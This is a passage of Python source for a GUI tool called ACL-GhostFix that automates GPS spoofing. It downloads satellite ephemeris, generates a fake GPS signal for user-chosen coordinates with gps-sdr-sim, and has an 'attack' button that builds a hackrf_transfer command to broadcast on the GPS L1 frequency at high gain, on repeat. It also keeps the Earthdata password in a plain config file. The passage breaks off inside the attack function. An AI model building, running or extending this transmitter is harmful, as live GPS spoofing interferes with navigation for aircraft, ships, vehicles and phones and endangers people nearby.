        lbl = ctk.CTkLabel(self.result_frame, text=t("slf_searching", self.lang),
                           font=self.parent.FONT_SMALL, text_color=C["yellow"])
        lbl.pack(anchor="w", padx=10, pady=8)
        self.result_widgets.append(lbl)
        threading.Thread(target=self._search_nominatim, args=(q,), daemon=True).start()

    def _search_nominatim(self, q):
        try:
            r = requests.get("https://nominatim.openstreetmap.org/search",
                params={"q": q, "format": "json", "limit": 7,
                        "accept-language": "en" if self.lang=="en" else "tr,en"},
                headers={"User-Agent": "ACL-GhostFix/3.1"}, timeout=10)
            results = r.json()
            self.after(0, lambda: self._show_results(results))
        except Exception as e:
            self.after(0, lambda: self._show_results([], error=str(e)))

    def _show_results(self, results, error=None):
        for w in self.result_widgets:
            w.destroy()
        self.result_widgets.clear()

        if error:
            self._show_placeholder(f"✗ Error: {error}", C["red"]); return
        if not results:
            self._show_placeholder(t("slf_no_result", self.lang)); return

        for res in results:
            lat  = float(res["lat"])
            lon  = float(res["lon"])
            name = res.get("display_name","")
            short = name[:65] + "..." if len(name) > 65 else name

            def make_cmd(la=lat, lo=lon, n=short):
                return lambda: self._set_result(la, lo, f"— {n}")

            btn = ctk.CTkButton(
                self.result_frame,
                text=f"📍  {short}",
                anchor="w",
                font=self.parent.FONT_TINY,
                fg_color=C["dim"], hover_color=C["neon_dim"],
                text_color=C["white"], corner_radius=6,
                height=32,
                command=make_cmd()
            )
            btn.pack(fill="x", padx=4, pady=2)
            self.result_widgets.append(btn)

    def _parse_gmap(self):
        url = self.gmap_var.get().strip()
        if not url: return

        m = re.search(r'@(-?\d+\.\d+),(-?\d+\.\d+)', url)
        if m:
            self._set_result(float(m.group(1)), float(m.group(2)), "— Google Maps")
            return

        m = re.search(r'[?&]q=(-?\d+\.\d+),(-?\d+\.\d+)', url)
        if m:
            self._set_result(float(m.group(1)), float(m.group(2)), "— Google Maps")
            return

        m = re.search(r'/place/([^/@]+)', url)
        if m:
            place = requests.utils.unquote(m.group(1)).replace('+', ' ')
            self.search_var.set(place)
            self._do_search()
            return

        if "goo.gl" in url or "maps.app" in url:
            threading.Thread(target=self._expand_short_url, args=(url,), daemon=True).start()
            return

        self.coord_lbl.configure(text=t("coord_err", self.lang), text_color=C["red"])

    def _expand_short_url(self, url):
        try:
            r = requests.head(url, allow_redirects=True, timeout=10)
            self.after(0, lambda: (self.gmap_var.set(r.url), self._parse_gmap()))
        except Exception as e:
            self.after(0, lambda: self.coord_lbl.configure(
                text=f"✗  Error: {e}", text_color=C["red"]))

    def _confirm(self):
        if self.found_lat is not None and self.found_lon is not None:
            self.on_select(self.found_lat, self.found_lon)
            self.destroy()
        else:
            self.coord_lbl.configure(text=t("coord_warn", self.lang), text_color=C["yellow"])


# ─────────────────────────────────────────────────────────────────────────────
# SETTINGS WINDOW
# ─────────────────────────────────────────────────────────────────────────────
class SettingsWindow(ctk.CTkToplevel):
    def __init__(self, parent, cfg, on_save, lang="en"):
        super().__init__(parent)
        self.lang = lang
        self.title(t("settings_title", lang))
        self.configure(fg_color=C["bg"])
        self.resizable(False, False)
        self.grab_set()
        self.cfg = cfg
        self.on_save = on_save
        self.parent = parent

        center_window(self, 600, 560)

        ctk.CTkFrame(self, fg_color=C["neon"], height=3, corner_radius=0).pack(fill="x")
        hdr = ctk.CTkFrame(self, fg_color=C["panel"], height=56, corner_radius=0)
        hdr.pack(fill="x"); hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text=t("settings_header", lang), font=parent.FONT_TITLE,
                     text_color=C["neon"]).pack(side="left", padx=20, pady=14)

        scroll = ctk.CTkScrollableFrame(self, fg_color="transparent",
                                         scrollbar_button_color=C["neon_dim"],
                                         scrollbar_button_hover_color=C["neon"])
        scroll.pack(fill="both", expand=True, padx=20, pady=10)

        def section(title, color):
            ctk.CTkLabel(scroll, text=title, font=parent.FONT_NORMAL,
                         text_color=color).pack(anchor="w", pady=(16,4))
            ctk.CTkFrame(scroll, fg_color=color, height=1,
                         corner_radius=0).pack(fill="x", pady=(0,10))

        def field(lbl, var, placeholder="", show=""):
            row = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=10)
            row.pack(fill="x", pady=4)
            ctk.CTkLabel(row, text=lbl, width=180, anchor="w",
                         font=parent.FONT_SMALL, text_color=C["gray"]
                         ).pack(side="left", padx=16, pady=14)
            e = ctk.CTkEntry(row, textvariable=var, show=show, width=310,
                             font=parent.FONT_MONO_SM,
                             fg_color=C["dark"], border_color=C["neon"],
                             text_color=C["white"], corner_radius=8,
                             placeholder_text=placeholder, height=38,
                             border_width=2)
            e.pack(side="left", padx=(0,16), pady=12)
            return e

        def browse_field(lbl, var, is_dir=False):
            row = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=10)
            row.pack(fill="x", pady=4)
            ctk.CTkLabel(row, text=lbl, width=180, anchor="w",
                         font=parent.FONT_SMALL, text_color=C["gray"]
                         ).pack(side="left", padx=16, pady=14)
            e = ctk.CTkEntry(row, textvariable=var, width=240,
                             font=parent.FONT_MONO_SM,
                             fg_color=C["dark"], border_color=C["neon2"],
                             text_color=C["white"], corner_radius=8, height=38,
                             border_width=2)
            e.pack(side="left", padx=(0,8), pady=12)
            def browse():
                if is_dir:
                    d = filedialog.askdirectory()
                    if d: var.set(d)
                else:
                    f = filedialog.askopenfilename(filetypes=[("EXE","*.exe"),("All","*.*")])
                    if f: var.set(f)
            ctk.CTkButton(row, text="📁", width=44, height=36,
                          fg_color=C["dim"], hover_color=C["neon_dim"],
                          text_color=C["neon"], corner_radius=8,
                          font=ctk.CTkFont(size=15),
                          command=browse).pack(side="left", padx=(0,16))

        section(t("sec_earthdata", lang), C["neon"])
        ctk.CTkLabel(scroll, text=t("earthdata_hint", lang),
                     font=parent.FONT_TINY, text_color=C["gray"]).pack(anchor="w", pady=(0,8))
        self.user = ctk.StringVar(value=cfg.get("earthdata_user",""))
        self.pwd  = ctk.StringVar(value=cfg.get("earthdata_pass",""))
        field(t("lbl_username", lang), self.user, "earthdata_username")
        field(t("lbl_password", lang), self.pwd, "••••••••", show="*")

        section(t("sec_workdir", lang), C["green"])
        ctk.CTkLabel(scroll, text="RINEX & .bin files are stored in subfolders of this directory."
                     if lang=="en" else "RINEX ve .bin dosyaları bu dizinin alt klasörlerine kaydedilir.",
                     font=parent.FONT_TINY, text_color=C["gray"]).pack(anchor="w", pady=(0,8))
        self.wdir = ctk.StringVar(value=cfg.get("work_dir", WORK_DIR))
        browse_field(t("lbl_folder", lang), self.wdir, is_dir=True)

        section(t("sec_gpssim", lang), C["yellow"])
        ctk.CTkLabel(scroll, text=t("gpssim_hint", lang),
                     font=parent.FONT_TINY, text_color=C["gray"]).pack(anchor="w", pady=(0,8))
        self.gsim = ctk.StringVar(value=cfg.get("gpssim_path", ""))
        gsim_row = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=10)
        gsim_row.pack(fill="x", pady=4)
        ctk.CTkLabel(gsim_row, text=t("lbl_gpssim_path", lang), width=180, anchor="w",
                     font=parent.FONT_SMALL, text_color=C["gray"]
                     ).pack(side="left", padx=16, pady=14)
        ctk.CTkEntry(gsim_row, textvariable=self.gsim, width=180,
                     font=parent.FONT_MONO_SM,
                     fg_color=C["dark"], border_color=C["neon2"],
                     text_color=C["white"], corner_radius=8, height=38,
                     border_width=2).pack(side="left", padx=(0,6), pady=12)
        def browse_gsim():
            f = filedialog.askopenfilename(filetypes=[("EXE","*.exe"),("All","*.*")])
            if f: self.gsim.set(f)
        ctk.CTkButton(gsim_row, text="📁", width=40, height=36,
                      fg_color=C["dim"], hover_color=C["neon_dim"],
                      text_color=C["neon"], corner_radius=8,
                      font=ctk.CTkFont(size=15),
                      command=browse_gsim).pack(side="left", padx=(0,6))
        def auto_detect():
            self.gsim.set("🔍  " + ("Scanning..." if lang=="en" else "Aranıyor..."))
            def run():
                found = find_gps_sdr_sim()
                self.gsim.set(found if found else "")
            threading.Thread(target=run, daemon=True).start()
        ctk.CTkButton(gsim_row, text="🔍 Auto" if lang=="en" else "🔍 Otomatik",
                      width=80, height=36,
                      fg_color=C["neon_dim"], hover_color=C["neon"],
                      text_color=C["white"], corner_radius=8,
                      font=parent.FONT_TINY,
                      command=auto_detect).pack(side="left", padx=(0,16))

        # Language section
        section(t("sec_language", lang), C["neon2"])
        lang_row = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=10)
        lang_row.pack(fill="x", pady=4)
        ctk.CTkLabel(lang_row, text=t("lbl_language", lang), width=180, anchor="w",
                     font=parent.FONT_SMALL, text_color=C["gray"]
                     ).pack(side="left", padx=16, pady=14)
        self.lang_var = ctk.StringVar(value=cfg.get("language", "en"))
        ctk.CTkOptionMenu(lang_row,
                          values=["en — English", "tr — Türkçe"],
                          variable=self.lang_var,
                          fg_color=C["dim"], button_color=C["neon_dim"],
                          button_hover_color=C["neon"],
                          text_color=C["white"], font=parent.FONT_SMALL,
                          corner_radius=8, width=200
                          ).pack(side="left", padx=(0,16), pady=12)

        sep = ctk.CTkFrame(self, fg_color=C["neon_dim"], height=1, corner_radius=0)
        sep.pack(fill="x")
        bf = ctk.CTkFrame(self, fg_color=C["panel"], corner_radius=0)
        bf.pack(fill="x", side="bottom")
        ctk.CTkButton(bf, text=t("btn_save", lang), height=48,
                      fg_color=C["neon"], text_color=C["bg"],
                      hover_color=C["green"],
                      font=ctk.CTkFont(size=13, weight="bold"),
                      corner_radius=10,
                      command=self._save).pack(fill="x", padx=20, pady=14)

    def _save(self):
        lang_raw = self.lang_var.get().split(" — ")[0].strip()
        new_work_dir = self.wdir.get()
        new_rinex_dir = os.path.join(new_work_dir, "rinex")
        new_bin_dir   = os.path.join(new_work_dir, "bin")
        os.makedirs(new_rinex_dir, exist_ok=True)
        os.makedirs(new_bin_dir, exist_ok=True)
        gsim_val = self.gsim.get()
        if gsim_val.startswith("🔍"):  # still scanning, don't save garbage
            gsim_val = self.cfg.get("gpssim_path", "")
        self.cfg.update({
            "earthdata_user": self.user.get(),
            "earthdata_pass": self.pwd.get(),
            "work_dir":       new_work_dir,
            "rinex_dir":      new_rinex_dir,
            "bin_dir":        new_bin_dir,
            "gpssim_path":    gsim_val,
            "language":       lang_raw,
        })
        save_config(self.cfg)
        self.on_save(self.cfg)
        self.destroy()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN APP
# ─────────────────────────────────────────────────────────────────────────────
class ACLGhostFix(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.cfg  = load_config()
        self.lang = self.cfg.get("language", "en")

        self.title(t("app_title", self.lang))
        self.configure(fg_color=C["bg"])
        self.resizable(True, True)
        self.minsize(980, 700)
        center_window(self, 1180, 820)

        self.FONT_NORMAL  = ctk.CTkFont(size=12, weight="bold")
        self.FONT_SMALL   = ctk.CTkFont(size=11, weight="bold")
        self.FONT_TINY    = ctk.CTkFont(size=10, weight="bold")
        self.FONT_TITLE   = ctk.CTkFont(size=15, weight="bold")
        self.FONT_BIG     = ctk.CTkFont(size=19, weight="bold")
        self.FONT_MONO    = ctk.CTkFont(family="Courier", size=11, weight="bold")
        self.FONT_MONO_SM = ctk.CTkFont(family="Courier", size=10, weight="bold")

        self.rinex_file  = None
        self.bin_file    = None
        self.attack_proc = None
        self.attacking   = False

        self.lat    = ctk.StringVar(value="41.0082")
        self.lon    = ctk.StringVar(value="28.9784")
        self.alt    = ctk.StringVar(value="50")
        self.gain   = ctk.IntVar(value=47)
        self.amp    = ctk.BooleanVar(value=True)
        self.dur    = ctk.StringVar(value="90")
        self.preset = ctk.StringVar(value="🇹🇷  Istanbul — Taksim")
        self.rmode  = ctk.StringVar(value="auto")
        self.rfile  = ctk.StringVar(value="No file selected" if self.lang=="en" else "Dosya seçilmedi")

        self._pulse_step = 0
        self._pulse_colors = [
            "#00CFFF","#00B8E8","#009FCC","#0090BB",
            "#009FCC","#00B8E8","#00CFFF"
        ]

        self._build()
        self._log(t("log_started", self.lang), C["neon"])
        self._log(t("log_workdir", self.lang) + self.cfg.get("work_dir", WORK_DIR), C["gray"])
        threading.Thread(target=self._check_deps, daemon=True).start()
        self._start_pulse()

    def _start_pulse(self):
        col = self._pulse_colors[self._pulse_step % len(self._pulse_colors)]
        try: self.header_line.configure(fg_color=col)
        except: pass
        self._pulse_step += 1
        self.after(120, self._start_pulse)

    def _build(self):
        self.header_line = ctk.CTkFrame(self, fg_color=C["neon"], height=3, corner_radius=0)
        self.header_line.pack(fill="x")

        top = ctk.CTkFrame(self, fg_color=C["panel"], height=58, corner_radius=0)
        top.pack(fill="x"); top.pack_propagate(False)

        ctk.CTkLabel(top, text=t("header_label", self.lang),
                     font=self.FONT_BIG, text_color=C["neon"]).pack(side="left", padx=20)
        ctk.CTkLabel(top, text=t("app_subtitle", self.lang),
                     font=self.FONT_TINY, text_color=C["gray"]).pack(side="left", padx=4)

        for txt_key, cmd, border in [
            ("btn_settings",  self._settings,   C["neon"]),
            ("btn_check",     lambda: threading.Thread(
                target=self._check_deps, daemon=True).start(), C["neon2"]),
            ("btn_opendir",   self._opendir,    C["gray2"]),
        ]:
            ctk.CTkButton(top, text=t(txt_key, self.lang), width=180, height=38,
                          fg_color=C["card"], hover_color=C["neon_dim"],
                          text_color=C["neon"], border_color=border,
                          border_width=1, corner_radius=8,
                          font=self.FONT_SMALL, command=cmd
                          ).pack(side="right", padx=6, pady=10)

        main = ctk.CTkFrame(self, fg_color="transparent")
        main.pack(fill="both", expand=True, padx=14, pady=10)

        left = ctk.CTkScrollableFrame(main, width=450, fg_color="transparent",
                                       scrollbar_button_color=C["neon_dim"],
                                       scrollbar_button_hover_color=C["neon"])
        left.pack(side="left", fill="y", padx=(0,10))
        right = ctk.CTkFrame(main, fg_color="transparent")
        right.pack(side="left", fill="both", expand=True)

        self._left(left)
        self._right(right)

    def _section(self, p, title, color=None):
        color = color or C["neon"]
        f = ctk.CTkFrame(p, fg_color="transparent")
        f.pack(fill="x", padx=4, pady=(14,5))
        ctk.CTkLabel(f, text=title, font=self.FONT_NORMAL,
                     text_color=color).pack(side="left")
        ctk.CTkFrame(f, fg_color=color, height=1, corner_radius=0
                     ).pack(side="left", fill="x", expand=True, padx=(8,0))

    def _card(self, p, **kw):
        return ctk.CTkFrame(p, fg_color=C["card"], corner_radius=12, **kw)

    def _neon_btn(self, parent, text, cmd, color=None, txt_color=None,
                  height=48, state="normal"):
        color = color or C["neon"]
        b = ctk.CTkButton(
            parent, text=text, height=height, corner_radius=10,
            fg_color=color, text_color=txt_color or C["bg"],
            hover_color="#FFFFFF",
            border_color=color, border_width=1,
            font=ctk.CTkFont(size=13, weight="bold"),
            state=state, command=cmd
        )
        b.pack(fill="x", padx=4, pady=4)
        return b

    def _left(self, p):
        self._section(p, t("sec_location", self.lang), C["neon"])

        ctk.CTkButton(p, text=t("btn_smart_loc", self.lang),
                      height=50, corner_radius=10,
                      fg_color=C["neon"], text_color=C["bg"],
                      hover_color=C["green"],
                      border_color=C["neon"], border_width=2,
                      font=ctk.CTkFont(size=14, weight="bold"),
                      command=self._smart_location
                      ).pack(fill="x", padx=4, pady=(0,4))

        ctk.CTkLabel(p, text=t("smart_loc_hint", self.lang),
                     font=self.FONT_TINY, text_color=C["gray"]
                     ).pack(anchor="w", padx=6, pady=(0,6))

        pc = self._card(p)
        pc.pack(fill="x", padx=4, pady=(0,6))
        pr = ctk.CTkFrame(pc, fg_color="transparent")
        pr.pack(fill="x", padx=14, pady=14)
        ctk.CTkLabel(pr, text=t("lbl_quick_preset", self.lang),
                     font=self.FONT_SMALL, text_color=C["gray"]).pack(side="left")
        ctk.CTkOptionMenu(pr, values=list(PRESETS.keys()),
                          variable=self.preset, command=self._preset,
                          fg_color=C["dim"], button_color=C["neon_dim"],
                          button_hover_color=C["neon"],
                          text_color=C["white"], font=self.FONT_TINY,
                          corner_radius=8, width=270
                          ).pack(side="right")

        cc = self._card(p)
        cc.pack(fill="x", padx=4, pady=(0,6))
        for lbl_key, var, bc in [
            ("lbl_lat", self.lat, C["neon"]),
            ("lbl_lon", self.lon, C["neon"]),
            ("lbl_alt", self.alt, C["neon2"])
        ]:
            row = ctk.CTkFrame(cc, fg_color="transparent")
            row.pack(fill="x", padx=14, pady=6)
            ctk.CTkLabel(row, text=t(lbl_key, self.lang), width=120, anchor="w",
                         font=self.FONT_SMALL, text_color=C["gray"]).pack(side="left")
            ctk.CTkEntry(row, textvariable=var, width=260,
                         font=self.FONT_MONO, fg_color=C["dark"],
                         border_color=bc, text_color=C["neon"],
                         corner_radius=8, height=38, border_width=2
                         ).pack(side="left", padx=(8,0))

        self._section(p, t("sec_rinex", self.lang), C["yellow"])
        rc = self._card(p)
        rc.pack(fill="x", padx=4, pady=(0,6))

        for val, txt_key in [("auto","radio_auto"), ("manual","radio_manual")]:
            ctk.CTkRadioButton(rc, text=t(txt_key, self.lang), variable=self.rmode, value=val,
                               font=self.FONT_SMALL, text_color=C["white"],
                               fg_color=C["neon"], hover_color=C["neon2"],
                               command=self._rmode
                               ).pack(anchor="w", padx=16,
                                      pady=(14,4) if val=="auto" else (0,8))

        fr = ctk.CTkFrame(rc, fg_color="transparent")
        fr.pack(fill="x", padx=14, pady=(0,14))
        self.rinex_entry = ctk.CTkEntry(fr, textvariable=self.rfile, width=300,
                                        font=self.FONT_MONO_SM,
                                        fg_color=C["dark"], border_color=C["border"],
                                        text_color=C["gray"], corner_radius=8,
                                        state="disabled", height=36)
        self.rinex_entry.pack(side="left")
        self.rinex_btn = ctk.CTkButton(fr, text="📁", width=44, height=36,
                                        fg_color=C["dim"], hover_color=C["neon_dim"],
                                        text_color=C["neon"], corner_radius=8,
                                        state="disabled", font=ctk.CTkFont(size=15),
                                        command=self._browse_rinex)
        self.rinex_btn.pack(side="left", padx=(8,0))

        self.earthdata_lbl = ctk.CTkLabel(rc,
            text=t("lbl_earthdata", self.lang) + self.cfg.get("earthdata_user", t("lbl_earthdata_na", self.lang)),
            font=self.FONT_TINY, text_color=C["gray"])
        self.earthdata_lbl.pack(anchor="w", padx=16, pady=(0,10))

        self._section(p, t("sec_attack", self.lang), C["orange"])
        sc = self._card(p)
        sc.pack(fill="x", padx=4, pady=(0,6))

        gt = ctk.CTkFrame(sc, fg_color="transparent")
        gt.pack(fill="x", padx=14, pady=(14,0))
        ctk.CTkLabel(gt, text=t("lbl_gain", self.lang), font=self.FONT_SMALL,
                     text_color=C["gray"]).pack(side="left")
        self.gain_lbl = ctk.CTkLabel(gt, text="47 dB",
                                      font=ctk.CTkFont(family="Courier", size=14, weight="bold"),
                                      text_color=C["red"])
        self.gain_lbl.pack(side="right")

        ctk.CTkSlider(sc, from_=0, to=47, variable=self.gain,
                      progress_color=C["orange"], button_color=C["neon"],
                      button_hover_color="#FFFFFF", fg_color=C["dim"],
                      command=lambda v: self._glbl(int(float(v)))
                      ).pack(fill="x", padx=14, pady=(6,12))

        row2 = ctk.CTkFrame(sc, fg_color="transparent")
        row2.pack(fill="x", padx=14, pady=(0,14))
        ctk.CTkLabel(row2, text=t("lbl_duration", self.lang), font=self.FONT_SMALL,
                     text_color=C["gray"]).pack(side="left")
        ctk.CTkEntry(row2, textvariable=self.dur, width=90,
                     font=self.FONT_MONO, fg_color=C["dark"], border_color=C["orange"],
                     text_color=C["white"], corner_radius=8, height=36,
                     border_width=2).pack(side="left", padx=12)
        ctk.CTkCheckBox(row2, text=t("lbl_amp", self.lang),
                        variable=self.amp, font=self.FONT_SMALL, text_color=C["white"],
                        fg_color=C["neon"], hover_color=C["neon2"],
                        corner_radius=4).pack(side="left", padx=4)

        self._section(p, t("sec_control", self.lang), C["green"])

        self.b_rinex = self._neon_btn(p, t("btn_rinex", self.lang), self._do_rinex, C["neon"])
        self.b_bin   = self._neon_btn(p, t("btn_bin", self.lang),   self._do_bin,   C["green"])
        self.b_atk   = self._neon_btn(p, t("btn_attack", self.lang), self._do_atk, C["orange"])
        self.b_stop  = self._neon_btn(p, t("btn_stop", self.lang),   self._stop,    C["red"],
                                       state="disabled")

        ctk.CTkFrame(p, fg_color=C["neon_dim"], height=1,
                     corner_radius=0).pack(fill="x", padx=4, pady=10)

        self._neon_btn(p, t("btn_auto", self.lang),
                        self._auto, C["yellow"], txt_color=C["bg"], height=52)

        self.status_lbl = ctk.CTkLabel(p, text=t("status_ready", self.lang),
                                        font=ctk.CTkFont(family="Courier", size=13, weight="bold"),
                                        text_color=C["green"])
        self.status_lbl.pack(pady=10)

    def _right(self, p):
        lh = ctk.CTkFrame(p, fg_color=C["panel"], height=52, corner_radius=10)
        lh.pack(fill="x", pady=(0,8)); lh.pack_propagate(False)
        ctk.CTkLabel(lh, text=t("terminal_label", self.lang), font=self.FONT_TITLE,
                     text_color=C["neon"]).pack(side="left", padx=16, pady=12)
        ctk.CTkButton(lh, text=t("btn_clear", self.lang), width=110, height=32,
                      fg_color=C["dim"], hover_color=C["neon_dim"],
                      text_color=C["neon"], corner_radius=8,
                      border_color=C["neon_dim"], border_width=1,
                      font=self.FONT_SMALL, command=self._clear
                      ).pack(side="right", padx=10, pady=10)

        self.log = ctk.CTkTextbox(p,
                                   font=ctk.CTkFont(family="Courier", size=11, weight="bold"),
                                   fg_color=C["dark"], text_color=C["neon"],
                                   border_color=C["neon_dim"], border_width=1,
                                   corner_radius=10, wrap="word", state="disabled")
        self.log.pack(fill="both", expand=True)
        tb = self.log._textbox
        for tag, col in [("t",C["neon"]),("g",C["green"]),("r",C["red"]),
                         ("y",C["yellow"]),("gr",C["gray"]),("o",C["orange"]),("w",C["white"])]:
            tb.tag_config(tag, foreground=col)

    def _log(self, msg, color=None):
        color = color or C["neon"]
        tag = {C["neon"]:"t",C["green"]:"g",C["red"]:"r",C["yellow"]:"y",
               C["gray"]:"gr",C["orange"]:"o",C["white"]:"w"}.get(color,"t")
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.log.configure(state="normal")
        self.log._textbox.insert("end", f"[{ts}] {msg}\n", tag)
        self.log._textbox.see("end")
        self.log.configure(state="disabled")

    def _status(self, msg, color=None):
        color = color or C["green"]
        self.status_lbl.configure(text=f"● {msg}", text_color=color)

    def _clear(self):
        self.log.configure(state="normal")
        self.log.delete("0.0","end")
        self.log.configure(state="disabled")

    def _opendir(self):
        d = self.cfg.get("work_dir", WORK_DIR)
        os.makedirs(d, exist_ok=True)
        os.makedirs(self.cfg.get("rinex_dir", RINEX_DIR), exist_ok=True)
        os.makedirs(self.cfg.get("bin_dir", BIN_DIR), exist_ok=True)
        os.startfile(d)

    def _glbl(self, v):
        col = C["green"] if v<20 else C["yellow"] if v<40 else C["red"]
        self.gain_lbl.configure(text=f"{v} dB", text_color=col)

    def _preset(self, name):
        if name in PRESETS:
            la,lo,al = PRESETS[name]
            self.lat.set(str(la)); self.lon.set(str(lo)); self.alt.set(str(al))
            self._log(t("preset_loaded", self.lang) + name, C["neon"])

    def _rmode(self):
        s = "normal" if self.rmode.get()=="manual" else "disabled"
        self.rinex_entry.configure(state=s)
        self.rinex_btn.configure(state=s)

    def _browse_rinex(self):
        f = filedialog.askopenfilename(
            title="Select RINEX File" if self.lang=="en" else "RINEX Dosyası Seç",
            filetypes=[("RINEX","*.??n *.nav *.rnx"),("All","*.*")])
        if f:
            self.rinex_file = f
            self.rfile.set(os.path.basename(f))
            self._log(f"Manual RINEX: {f}", C["green"])

    def _smart_location(self):
        SmartLocationFinder(self, lambda la,lo: (
            self.lat.set(f"{la:.4f}"),
            self.lon.set(f"{lo:.4f}"),
            self._log(t("loc_selected", self.lang) + f"{la:.4f}°, {lo:.4f}°", C["neon"])
        ), lang=self.lang)

    def _settings(self):
        SettingsWindow(self, self.cfg, self._on_settings, lang=self.lang)

    def _on_settings(self, cfg):
        self.cfg = cfg
        new_lang = cfg.get("language", "en")
        u = cfg.get("earthdata_user","")
        self.earthdata_lbl.configure(
            text=t("lbl_earthdata", new_lang) + (u if u else t("lbl_earthdata_na", new_lang)),
            text_color=C["green"] if u else C["gray"])
        self._log(t("settings_saved", new_lang), C["green"])
        if new_lang != self.lang:
            self.lang = new_lang
            self._log("Language changed — please restart the app to apply fully.", C["yellow"])

    def _check_deps(self):
        self._log("─"*42, C["gray"])
        self._log(t("log_checking", self.lang), C["gray"])
        sim = self.cfg.get("gpssim_path", "")

        if sim and os.path.exists(sim):
            self._log(t("log_sim_found", self.lang) + f"  ({sim})", C["green"])
        else:
            # Not configured yet, or saved path no longer exists -> auto-discover
            found = find_gps_sdr_sim(log_cb=self._log)
            if found:
                self.cfg["gpssim_path"] = found
                self.cfg["gpssim_autodetected"] = True
                save_config(self.cfg)
                self._log(t("log_sim_found", self.lang) + f"  ({found})  — saved to settings", C["green"])
            else:
                self._log(t("log_sim_missing", self.lang) + "(not found)", C["red"])
                self._log(t("log_sim_dl", self.lang), C["gray"])
                self._log("   → You can also set the path manually in Settings.", C["gray"])
        try:
            r = subprocess.run(["hackrf_info"], capture_output=True, text=True, shell=True)
            if "Found HackRF" in r.stdout:
                self._log(t("log_hackrf_ok", self.lang), C["green"])
                for ln in r.stdout.splitlines():
                    if any(k in ln for k in ["Serial","Board","Firmware","Hardware Rev"]):
                        self._log(f"   {ln.strip()}", C["gray"])
            else:
                self._log(t("log_hackrf_no", self.lang), C["red"])
        except Exception as e:
            self._log(t("log_hackrf_err", self.lang) + str(e), C["red"])
        u = self.cfg.get("earthdata_user","")
        self._log(
            f"{'✓' if u else '⚠'}  {t('log_ed_set', self.lang)}{u if u else t('log_ed_na', self.lang)}",
            C["green"] if u else C["yellow"])

    def _do_rinex(self):
        if self.rmode.get()=="manual":
            if self.rinex_file and os.path.exists(str(self.rinex_file)):
                self._log(t("log_rinex_manual_ok", self.lang) + str(self.rinex_file), C["green"])
            else:
                self._log(t("log_rinex_pick", self.lang), C["red"])
            return
        threading.Thread(target=self._dl_rinex, daemon=True).start()

    def _dl_rinex(self):
        self._status(t("status_rinex_dl", self.lang), C["yellow"])
        self._log("─"*42, C["gray"])
        self._log(t("log_rinex_step", self.lang), C["neon"])

        rinex_dir = self.cfg.get("rinex_dir", RINEX_DIR)
        user = self.cfg.get("earthdata_user","")
        pwd  = self.cfg.get("earthdata_pass","")

        result = download_rinex(rinex_dir, user, pwd, self._log, self.lang)

        if result:
            self.rinex_file = result
            self.rfile.set(os.path.basename(result))
            self._status(t("status_rinex_ok", self.lang), C["green"])
            self._log(f"📁  Folder: {os.path.dirname(result)}" if self.lang=="en"
                       else f"📁  Klasör: {os.path.dirname(result)}", C["gray"])
        else:
            # Try using any existing nav file already in the rinex folder
            try:
                ex = [f for f in os.listdir(rinex_dir)
                      if f.endswith(".nav") or (len(f)>3 and f[-1]=="n")]
                if ex:
                    self.rinex_file = os.path.join(rinex_dir, ex[0])
                    self._log(t("log_rinex_old", self.lang) + ex[0], C["yellow"])
                    self._status(f"RINEX: {ex[0]}", C["yellow"])
                else:
                    self._status(t("log_rinex_fail", self.lang), C["red"])
                    self._log(t("log_rinex_manual", self.lang), C["gray"])
            except Exception:
                self._status(t("log_rinex_fail", self.lang), C["red"])

    def _do_bin(self):
        if not self.rinex_file or not os.path.exists(str(self.rinex_file)):
            self._log(t("log_bin_no_rinex", self.lang), C["red"]); return
        threading.Thread(target=self._gen_bin, daemon=True).start()

    def _gen_bin(self):
        self._status(t("status_bin", self.lang), C["yellow"])
        self._log("─"*42, C["gray"])
        self._log(t("log_bin_step", self.lang), C["green"])
        try:
            la=float(self.lat.get()); lo=float(self.lon.get())
            al=float(self.alt.get()); du=int(self.dur.get())
        except ValueError:
            self._log(t("log_bin_coord_err", self.lang), C["red"]); return

        sim = self.cfg.get("gpssim_path", "")
        if not sim or not os.path.exists(sim):
            found = find_gps_sdr_sim(log_cb=self._log)
            if found:
                sim = found
                self.cfg["gpssim_path"] = found
                self.cfg["gpssim_autodetected"] = True
                save_config(self.cfg)
            else:
                self._log(t("log_bin_missing", self.lang) + "(not found — set it in Settings)", C["red"])
                self._status(t("status_error", self.lang), C["red"])
                return

        bin_dir = self.cfg.get("bin_dir", BIN_DIR)
        os.makedirs(bin_dir, exist_ok=True)
        ts   = datetime.datetime.now().strftime("%H%M%S")
        self.bin_file = os.path.join(bin_dir, f"ghostfix_{ts}.bin")
        cmd  = [sim,"-e",str(self.rinex_file),
                "-l",f"{la},{lo},{al}",
                "-b","8","-s","2600000","-d",str(du),"-o",self.bin_file]
        self._log(f"Coordinates: {la}°, {lo}°, {al}m  |  Duration: {du}s", C["gray"])
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True, shell=False)
            for line in proc.stdout:
                l=line.strip()
                if l: self._log(f"  {l}", C["gray"])
            proc.wait()
            if proc.returncode==0 and os.path.exists(self.bin_file):
                sz = os.path.getsize(self.bin_file)/1e6
                self._log(t("log_bin_ok", self.lang) + f"{os.path.basename(self.bin_file)}  ({sz:.1f} MB)", C["green"])
                self._status(t("status_bin_ok", self.lang), C["green"])
            else:
                self._log(t("log_bin_fail", self.lang), C["red"])
                self._status(t("status_error", self.lang), C["red"])
        except FileNotFoundError:
            self._log(t("log_bin_missing", self.lang) + sim, C["red"])

    def _do_atk(self):
        if not self.bin_file or not os.path.exists(str(self.bin_file)):
            self._log(t("log_atk_no_bin", self.lang), C["red"]); return
        threading.Thread(target=self._attack, daemon=True).start()

    def _attack(self):
        self._status(t("status_attack", self.lang), C["red"])
        self._log("─"*42, C["gray"])
        self._log(t("log_atk_step", self.lang), C["red"])
        g = self.gain.get()
        self._log(f"Freq: 1575.42 MHz  |  Gain: {g} dB  |  Amp: {'ON' if self.amp.get() else 'OFF'}", C["gray"])
        cmd = ["hackrf_transfer","-t",str(self.bin_file),
               "-f","1575420000","-s","2600000",
               "-a","1" if self.amp.get() else "0",
               "-x",str(g),"-R"]
